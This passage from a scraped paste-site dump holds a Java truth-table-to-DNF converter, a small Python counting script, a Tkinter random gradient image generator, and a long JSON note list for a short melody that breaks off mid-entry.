    public static String convertFromTableToDNF(Scanner sc) {
        // Устанавливаем в качестве разделителя символ новой строки
        sc.useDelimiter(""\n"");

        // Считываем многострочный текст
        System.out.println(""Введите многострочный текст (для завершения введите Ctrl+D в конце):"");

        int lineCounter = 0;
        String outputDNF = """";

        while (lineCounter < 32) {
            String line = sc.next();
            lineCounter++;
            if(!convertTableStringToDNF(line).equals("""")) {
                outputDNF += convertTableStringToDNF(line) + ""+"";
            }
        }

        return outputDNF.substring(0, outputDNF.length() - 1);
    }

    public static String convertTableStringToDNF (String input) {
        String[] arr = input.split(""\t"");

        if(arr[5].equals(""0"")) {
            return """";
        }

        String output = """";

        if(arr[0].equals(""1"")) {
            output += ""a"";
        } else {
            output += ""~a"";
        }

        if(arr[1].equals(""1"")) {
            output += ""b"";
        } else {
            output += ""~b"";
        }

        if(arr[2].equals(""1"")) {
            output += ""c"";
        } else {
            output += ""~c"";
        }

        if(arr[3].equals(""1"")) {
            output += ""d"";
        } else {
            output += ""~d"";
        }

        if(arr[4].equals(""1"")) {
            output += ""e"";
        } else {
            output += ""~e"";
        }

        return output;
    }
}
"
wCRXegxP,Untitled,ateyevtm,Python,Sunday 17th of December 2023 02:56:20 PM CDT,"n,m=map(int,input().split())

count = 0

for i in range(1,n+1):
    for j in range(1,n+1):
        for k in range(1,n+1):
            for w in range(1,n+1):
                if i+j+k+w<=n and i*j*k*w<=m:
                    count+=1;

print(count);"
7hZQu1HT,# 512x512_rgb_gradient_ctrl.py,here2share,Python,Sunday 17th of December 2023 02:30:31 PM CDT,"# 512x512_rgb_gradient_ctrl.py

import tkinter as tk
import random
from PIL import Image, ImageTk, ImageFilter

ww = 512
hh = 512

root = tk.Tk()
root.title(""512x512_image_generator"")
root.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

canvas = tk.Canvas(root, width=ww, height=hh)
canvas.pack()

def generate(event=None):
	for size in layers:
		interpolate(size)
	draw()

def interpolate(size):
	img = Image.new(""RGBA"", (size, size))
	pixels = img.load()
	for y in range(size):
		for x in range(size):
			red = random.randint(0, 255)
			green = random.randint(0, 255)
			blue = random.randint(0, 255)
			pixels[x, y] = (red, green, blue, 255)
	img = img.resize((ww, hh))
	layers[size] = img

def draw(event=None):
	buffer = Image.new(""RGBA"", (ww, hh), (255, 255, 255, 255))
	for size, layer_image in layers.items():
		if size != 4:
			alpha = float(opacity_slider[size].get()) / 2056.0
		else:
			alpha = 1	 
		buffer = Image.blend(buffer, layer_image, alpha)
	
	photo = ImageTk.PhotoImage(buffer)
	canvas.create_image(0, 0, anchor=tk.NW, image=photo)
	canvas.image = photo

opacity_label = tk.Toplevel(root)
opacity_title = tk.Label(opacity_label, text=""Press Spacebar To Randomize"")
opacity_title.pack()
opacity_slider = {}
layers = {}

size = 4
interpolate(size)
while size - 1 < 512 / 4:
	size *= 2
	opacity_slider[size] = tk.Scale(opacity_label, from_=512, to=0, orient=tk.VERTICAL, label=size, command=draw)
	opacity_slider[size].pack(side=tk.LEFT, fill='both', expand=True)
	opacity_slider[size].set(5)
	interpolate(size)

canvas.update()
t = opacity_label.winfo_width()
opacity_label.geometry(""%dx300+%d+%d"" %(t, 50, 50))
for t in (root, opacity_label):
	t.bind(""<space>"", generate)
opacity_label.wm_transient(root)

draw()
root.mainloop()"
xUQEvPWh,test-song,coolkase,JSON,Sunday 17th of December 2023 02:01:13 PM CDT,"{
  ""header"": {
    ""PPQ"": 384,
    ""timeSignature"": [
      4,
      4
    ],
    ""bpm"": 124.000248000496,
    ""name"": """"
  },
  ""tempo"": [
    {
      ""absoluteTime"": 0,
      ""seconds"": 0,
      ""bpm"": 124.000248000496
    }
  ],
  ""timeSignature"": [
    {
      ""absoluteTime"": 0,
      ""seconds"": 0,
      ""numerator"": 4,
      ""denominator"": 2,
      ""click"": 24,
      ""notesQ"": 8
    }
  ],
  ""startTime"": 0,
  ""duration"": 40.645080000000036,
  ""tracks"": [
    {
      ""startTime"": 0,
      ""duration"": 40.645080000000036,
      ""length"": 160,
      ""notes"": [
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 0,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 0.241935,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 0.48387,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 0.725805,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 0.96774,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 1.209675,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 1.45161,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 1.693545,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241935
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 1.93548,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 2.177415,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 2.4193499999999997,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 2.6612849999999995,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 2.9032199999999992,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 3.145154999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 3.387089999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 3.6290249999999986,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 3.8709599999999984,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 4.112894999999998,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 4.354829999999998,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 4.596764999999998,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 4.838699999999998,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 5.080634999999997,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 5.322569999999997,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 5.564504999999997,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 5.806439999999997,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 6.0483749999999965,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 6.290309999999996,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 6.532244999999996,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 6.774179999999996,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 7.016114999999996,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 7.2580499999999954,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 7.499984999999995,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 7.741919999999995,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 7.983854999999995,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 8.225789999999995,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 8.467724999999994,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 8.709659999999994,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 8.951594999999994,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 9.193529999999994,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 9.435464999999994,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 9.677399999999993,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 9.919334999999993,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 10.161269999999993,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 10.403204999999993,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 10.645139999999992,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 10.887074999999992,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 11.129009999999992,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 11.370944999999992,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 11.612879999999992,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 11.854814999999991,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 12.096749999999991,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 12.338684999999991,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 12.58061999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 12.82255499999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 13.06448999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 13.30642499999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 13.54835999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 13.79029499999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 14.03222999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 14.27416499999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 14.51609999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 14.758034999999989,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 14.999969999999989,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 15.241904999999988,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 15.483839999999988,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 15.725774999999988,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 15.967709999999988,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.2419349999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 16.209644999999988,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 16.45157999999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 16.69351499999999,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 16.935449999999992,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 17.177384999999994,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 17.419319999999995,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 17.661254999999997,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 17.90319,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 18.145125,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 18.38706,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 18.628995000000003,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D6"",
          ""midi"": 86,
          ""time"": 18.870930000000005,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 19.112865000000006,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 19.354800000000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 19.59673500000001,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 19.83867000000001,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 20.080605000000013,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 20.322540000000014,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 20.564475000000016,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 20.806410000000017,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 21.04834500000002,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 21.29028000000002,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 21.532215000000022,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 21.774150000000024,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 22.016085000000025,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 22.258020000000027,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 22.49995500000003,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D6"",
          ""midi"": 86,
          ""time"": 22.74189000000003,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E6"",
          ""midi"": 88,
          ""time"": 22.98382500000003,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 23.225760000000033,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 23.467695000000035,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 23.709630000000036,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 23.951565000000038,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 24.19350000000004,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 24.43543500000004,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 24.677370000000042,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 24.919305000000044,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 25.161240000000046,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 25.403175000000047,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 25.64511000000005,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 25.88704500000005,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 26.128980000000052,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 26.370915000000053,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 26.612850000000055,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 26.854785000000057,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 27.096720000000058,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 27.33865500000006,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 27.58059000000006,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 27.822525000000063,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 28.064460000000064,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 28.306395000000066,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 28.548330000000067,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 28.79026500000007,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 29.03220000000007,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 29.274135000000072,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E4"",
          ""midi"": 64,
          ""time"": 29.516070000000074,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B4"",
          ""midi"": 71,
          ""time"": 29.758005000000075,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A4"",
          ""midi"": 69,
          ""time"": 29.999940000000077,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D4"",
          ""midi"": 62,
          ""time"": 30.24187500000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 30.48381000000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 30.72574500000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 30.967680000000083,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 31.209615000000085,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 31.451550000000086,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 31.693485000000088,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 31.93542000000009,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.24193500000000157
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 32.17735500000009,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 32.41929000000009,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 32.66122500000009,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 32.903160000000085,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 33.14509500000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 33.38703000000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 33.62896500000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 33.87090000000008,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 34.112835000000075,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""D6"",
          ""midi"": 86,
          ""time"": 34.35477000000007,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 34.59670500000007,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 34.83864000000007,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 35.08057500000007,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 35.322510000000065,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 35.56444500000006,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 35.80638000000006,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 36.04831500000006,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 36.29025000000006,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 36.532185000000055,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 36.77412000000005,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 37.01605500000005,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""E5"",
          ""midi"": 76,
          ""time"": 37.25799000000005,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""B5"",
          ""midi"": 83,
          ""time"": 37.49992500000005,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""A5"",
          ""midi"": 81,
          ""time"": 37.741860000000045,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""D5"",
          ""midi"": 74,
          ""time"": 37.98379500000004,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""D6"",
          ""midi"": 86,
          ""time"": 38.22573000000004,
          ""velocity"": 0.1968503937007874,
          ""duration"": 0.241934999999998
        },
        {
          ""name"": ""E6"",
